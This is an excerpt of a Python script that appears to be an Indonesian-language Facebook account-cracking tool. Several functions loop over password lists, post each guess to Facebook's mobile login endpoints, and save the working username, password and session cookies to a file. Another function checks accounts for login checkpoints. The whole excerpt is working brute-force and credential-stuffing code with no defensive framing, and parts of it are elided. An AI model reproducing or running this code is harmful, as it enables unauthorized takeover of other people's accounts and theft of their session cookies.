...
def mbasic(uid, fii):
	...
	for pw in fii:
		...
		dataD = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}•{kuki}")
			ok.append("%s|%s|%s"%(uid, pw, kuki))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s|%s\n"%(uid, pw, kuki))
			break
...
def mobil(uid, fii):
	...
	for pw in fii:
		...
		data.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		dataD = ss.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}•{kuki}")
			ok.append("%s|%s|%s"%(uid, pw, kuki))
...
def mobill(uid, fii):
	...
	for pw in fii:
		...
		for i in b("input"):
			...
			data.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		dataD = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}•{kuki}")
			ok.append("%s|%s|%s"%(uid, pw, kuki))
...
def cek_log(uid,pw,ua):
	...
	if "checkpoint" in ses.cookies:
		...
		if "0" in str(len(ngew)):
			jalan(f"\r{P}[•]{I} akun one tap, silahkan di login")
...
def log_hasil(user, pasw):
    ...
    if "c_user" in ses.cookies:jalan(f"\r{P}[•]{I} Akun berhasil berhasil, di login")
        ...
        ngew = [yy.text for yy in tempek.find_all("option")]
        jalan("%s[•] terdapat %s[%s]%s opsi "%(P,B,str(len(ngew)),P))
        for opt in range(len(ngew)):
            print(f"{B} | ")
